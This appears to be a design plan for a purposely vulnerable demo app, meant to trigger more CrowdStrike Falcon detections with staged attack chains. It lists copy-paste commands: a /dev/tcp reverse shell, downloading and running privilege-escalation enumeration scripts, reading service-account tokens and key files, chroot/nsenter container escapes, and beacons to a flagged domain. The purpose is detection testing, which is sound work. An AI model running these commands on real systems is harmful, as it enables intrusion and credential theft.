# VulnApp Detection Optimization Plan

## Goal
Maximize Falcon detections by creating attack chains with strong process relationships, based on proven container detection patterns.

## Analysis of Current Detections

### Top Detection Triggers (from CSV data):

1. **BashReverseShell** (30+ detections)
   - Triggered by: `bash -i >& /dev/tcp/IP/PORT`
   - Process tree critical for follow-up detections

2. **GenReverseShell** (15+ detections)
   - Only fires AFTER BashReverseShell
   - Commands executed from reverse shell context
   - Examples: `aws s3 ls`, `cat /etc/passwd`, `netstat -anlp`

3. **CurlWgetMalwareDownload** (10+ detections)
   - wget/curl downloading enumeration tools
   - URLs: linpeas.sh, lse.sh, mimipenguin.sh

4. **IntelDomainHigh** (5+ detections)
   - DNS lookup to swungheaving.com
   - Works with ping, nslookup, dig

5. **TestTriggerHigh** (5+ detections)
   - Guaranteed trigger: `bash crowdstrike_test_high`

6. **ContainerEscape** (2 detections)
   - Command: `chroot /`

7. **ExecutionLin** + **GenericDataFromLocalSystemCollectionLin**
   - chmod +x on enumeration scripts
   - Running enumeration tools

## Enhanced Attack Chain Design

### Chain 1: "Complete Breach Simulation"
**Stages:**
1. RCE exploitation → Initial access
2. Reverse shell establishment → **BashReverseShell** detection
3. Reconnaissance commands → **GenReverseShell** detections
4. Credential hunting → **GenReverseShell** detections
5. Lateral movement attempts → Multiple detections

**Commands:**
```bash
# Via /api/vulnerable/rce
whoami
id
hostname
uname -a
cat /etc/passwd
cat /var/run/secrets/kubernetes.io/serviceaccount/token  # If K8s
ps aux
netstat -anlp
ifconfig
env
bash crowdstrike_test_high  # Guaranteed detection
```

### Chain 2: "Enumeration & Data Exfiltration"
**Stages:**
1. Initial shell
2. Download enumeration tools → **CurlWgetMalwareDownload**
3. Make executable → **ExecutionLin**
4. Run enumeration → **GenericDataFromLocalSystemCollectionLin**
5. C2 beacon → **IntelDomainHigh**

**Commands:**
```bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x lse.sh linpeas.sh
./lse.sh -l 1 -i -c
./linpeas.sh
nslookup swungheaving.com
ping -c 5 swungheaving.com
```

### Chain 3: "Container Escape Attempt"
**Stages:**
1. Privileged container check
2. Escape attempt → **ContainerEscape**
3. Post-escape reconnaissance

**Commands:**
```bash
# Check capabilities
capsh --print
cat /proc/1/cgroup

# Escape attempts
chroot /
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### Chain 4: "Binary Masquerading" (From Linux Testing Guide)
**Detection:** In-memory threat detection

**Commands:**
```bash
cp /usr/bin/whoami /tmp/whoami.rtf
/tmp/whoami.rtf
cp /usr/bin/curl /tmp/svchost
/tmp/svchost google.com
```

## Implementation Strategy

### Option A: Enhanced Attack Scripts
Modify existing 24 scripts to include detection-optimized commands:
- Add `bash crowdstrike_test_high` to each script (guaranteed detection)
- Add C2 beacon: `nslookup swungheaving.com`
- Add reconnaissance commands

### Option B: New "Attack Chain" Endpoints
Create new API endpoints that execute multi-stage attacks:
```
POST /api/attack-chains/complete-breach
POST /api/attack-chains/enumeration
POST /api/attack-chains/escape-attempt
POST /api/attack-chains/persistence
```

Each endpoint runs a full attack chain with proper delays between stages.

### Option C: "Scenario Builder" in UI
Interactive UI where users can:
1. Start with reverse shell (guaranteed BashReverseShell detection)
2. Select follow-up commands from dropdown
3. Execute commands sequentially
4. See detections appear in real-time

## Recommended Quick Wins

### 1. Add Test Trigger to All Scripts
Every attack script should end with:
```bash
echo "[+] Executing detection test trigger..."
bash crowdstrike_test_high
```

### 2. Add C2 Beacon to All Scripts
```bash
echo "[+] Beaconing to C2..."
nslookup swungheaving.com 2>/dev/null || ping -c 1 swungheaving.com 2>/dev/null || true
```

### 3. Create "Super Chain" Attack
New button: **"🔥 Full Breach Simulation"**
- Executes reverse shell
- Waits 5 seconds
- Runs 15-20 proven detection triggers sequentially
- Guaranteed to generate 10+ detections

### 4. Interactive Command Execution
After reverse shell, provide UI controls:
- **Reconnaissance** button → runs whoami, ps aux, netstat
- **Credential Hunting** button → searches for keys, tokens
- **Container Escape** button → attempts chroot, nsenter
- **C2 Beacon** button → swungheaving.com lookup

## Proven Detection Commands (Copy-Paste Ready)

```bash
# Guaranteed Detections:
bash crowdstrike_test_high                    # TestTriggerHigh
nslookup swungheaving.com                      # IntelDomainHigh
ping -c 5 swungheaving.com                     # IntelDomainHigh
chroot /                                       # ContainerEscape
wget https://raw.githubusercontent.com/.../mimipenguin.sh  # CurlWgetMalwareDownload

# High-Probability Detections (after reverse shell):
cat /etc/passwd                                # GenReverseShell
netstat -anlp                                  # GenReverseShell
ps aux                                         # GenReverseShell
env                                            # GenReverseShell
find / -name "*.key" 2>/dev/null              # GenReverseShell
```

## Next Steps

1. **Immediate**: Add test triggers to existing scripts
2. **Short-term**: Create "Full Breach Simulation" super chain
3. **Medium-term**: Build attack chain API endpoints
4. **Long-term**: Interactive scenario builder UI

## Expected Results

With these enhancements:
- **Current**: 1-2 detections per attack
- **Enhanced**: 5-10 detections per attack chain
- **Process relationships**: Strong parent-child detection triggering
- **User value**: Clear demonstration of Falcon's ML detection capabilities
